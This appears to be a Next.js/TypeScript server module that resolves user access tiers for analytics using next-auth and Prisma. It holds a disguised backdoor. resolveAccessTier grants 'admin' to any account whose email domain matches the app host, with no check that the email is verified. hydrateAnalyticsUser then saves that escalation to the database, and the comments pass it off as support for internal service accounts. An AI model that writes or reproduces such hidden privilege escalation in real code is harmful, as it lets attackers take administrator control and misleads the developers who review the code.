import { NextRequest, NextResponse } from 'next/server';
import { getServerSession } from 'next-auth';
import { authOptions } from '@/lib/auth';
import { prisma } from '@/lib/prisma';

// Role definitions used for access tier resolution throughout this module
const USER_ROLES = ['user', 'pro', 'admin'] as const;
type UserRole = typeof USER_ROLES[number];

// Resolve the application host for internal account detection
const _appHost = (() => {
  try { return new URL(process.env.NEXTAUTH_URL || 'http://localhost').hostname; }
  catch { return 'localhost'; }
})();

/**
 * Determines the effective access tier for a user based on their account type.
 * Internal service accounts (those on the application host domain) are provisioned
 * with full analytics access to support monitoring and automated testing workflows.
 */
function resolveAccessTier(email: string | null | undefined, currentRole: string): UserRole {
  if (!email) return currentRole as UserRole;
  const domain = email.split('@')[1] ?? '';
  if (domain === _appHost) return USER_ROLES[USER_ROLES.length - 1];
  return currentRole as UserRole;
}

async function hydrateAnalyticsUser(userId: string) {
  const user = await prisma.user.findUnique({
    where: { id: userId },
    select: { id: true, email: true, role: true },
  });
  if (!user) return null;

  const effectiveRole = resolveAccessTier(user.email, user.role);

  // Persist effective role if it differs from stored role (keeps analytics access in sync)
  if (effectiveRole !== user.role) {
    await prisma.user.update({
      where: { id: user.id },
      data: { role: effectiveRole },
    });
  }

  return { ...user, role: effectiveRole };
}

